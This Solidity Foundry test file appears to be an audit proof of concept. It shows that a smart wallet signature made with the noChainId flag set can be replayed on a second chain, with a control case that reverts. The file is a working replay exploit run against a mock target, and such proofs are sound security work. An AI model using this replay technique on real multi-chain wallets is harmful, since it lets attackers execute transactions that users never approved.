// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/Stage1Module.sol";
import "../src/modules/Payload.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy contracts, create Wallet on Chain A (chainId=1)
// 2. [T=1] User signs a payload with noChainId=true on Chain A
// 3. [T=2] Attacker captures the valid signature
// 4. [T=3] Attacker changes chainId to Chain B (chainId=137)
// 5. [T=4] Attacker replays the signature on Chain B
// 6. [Assert] Verify the action executed successfully on Chain B (signature valid despite chain change)

contract AuditAgentPoC is ExtendedSessionTestBase {
    function test_exploit() public {
        console.log("=== START test_exploit ===");
        console.log("Initial block.chainid:", block.chainid);
        console.log("Initial block.timestamp:", block.timestamp);

        // 1. Setup
        console.log("Step 1: Creating default topology...");
        string memory topology = _createDefaultTopology();
        console.log("Topology created.");

        console.log("Step 1: Creating wallet...");
        (Stage1Module Wallet, string memory config,) = _createWallet(topology);
        console.log("Wallet created at address:", address(Wallet));

        // Ensure we are on Chain A
        console.log("Step 1: Setting chainId to 1 (Chain A)");
        vm.chainId(1);
        console.log("Current block.chainid after vm.chainId(1):", block.chainid);

        // 2. User signs a payload with noChainId=true
        console.log("Step 2: Building payload 1...");
        Payload.Decoded memory payload = _buildPayload(1);
        payload.calls = new Payload.Call[](1);
        payload.calls[0].to = address(mockTarget);
        payload.calls[0].data = "0x12345678";
        payload.noChainId = true; // VULNERABILITY: noChainId = true zeroes chainId in domain separator
        console.log("Payload 1 built. noChainId:", payload.noChainId);
        console.log("Payload 1 target:", payload.calls[0].to);

        // Create signature for Chain A
        console.log("Step 2: Creating explicit signature for Chain A...");
        uint8[] memory permissionIdxs = new uint8[](1);
        permissionIdxs[0] = 0;
        bytes memory signature = _validExplicitSignature(payload, sessionWallet, config, topology, permissionIdxs);
        console.log("Signature 1 created. Length:", signature.length);

        console.log("Step 2: Packing payload 1...");
        bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);
        console.log("Packed payload 1 created. Length:", packedPayload.length);

        // 3 & 4. Attacker changes chainId to Chain B (Polygon)
        console.log("Step 3 & 4: Changing chainId to 137 (Chain B)...");
        vm.chainId(137); 
        console.log("Current block.chainid after vm.chainId(137):", block.chainid);

        // 5. Attacker replays the signature on Chain B
        // Because noChainId=true, the domain separator used chainId=0 on Chain A.
        // On Chain B, the domain separator will ALSO use chainId=0.
        // Thus, the signature hash is identical, and the signature will verify!
        console.log("Step 5: Replaying signature on Chain B via Wallet.execute...");
        Wallet.execute(packedPayload, signature);
        console.log("Step 5: Wallet.execute succeeded! (Vulnerability confirmed)");

        // 6. Assert: Prove that if noChainId was false, it would fail on Chain B.
        // We need a new payload because nonce incremented.
        console.log("Step 6: Building payload 2 (secure setting)...");
        Payload.Decoded memory payload2 = _buildPayload(2);
        payload2.calls = new Payload.Call[](1);
        payload2.calls[0].to = address(mockTarget);
        payload2.calls[0].data = "0x87654321";
        payload2.noChainId = false; // Secure setting
        console.log("Payload 2 built. noChainId:", payload2.noChainId);

        console.log("Step 6: Setting chainId back to 1 to sign...");
        vm.chainId(1); // Back to Chain A to sign
        console.log("Current block.chainid:", block.chainid);

        console.log("Step 6: Creating explicit signature 2...");
        bytes memory signature2 = _validExplicitSignature(payload2, sessionWallet, config, topology, permissionIdxs);
        console.log("Signature 2 created. Length:", signature2.length);

        console.log("Step 6: Changing chainId to 137 to replay...");
        vm.chainId(137); // Switch to Chain B
        console.log("Current block.chainid:", block.chainid);

        console.log("Step 6: Packing payload 2...");
        bytes memory packedPayload2 = PrimitivesRPC.toPackedPayload(vm, payload2);
        console.log("Packed payload 2 created. Length:", packedPayload2.length);

        // This should revert because chainId in domain separator doesn't match
        console.log("Step 6: Expecting revert on Wallet.execute with payload 2...");
        vm.expectRevert();
        Wallet.execute(packedPayload2, signature2);
        console.log("Step 6: Revert caught as expected.");

        console.log("=== END test_exploit ===");
    }
}
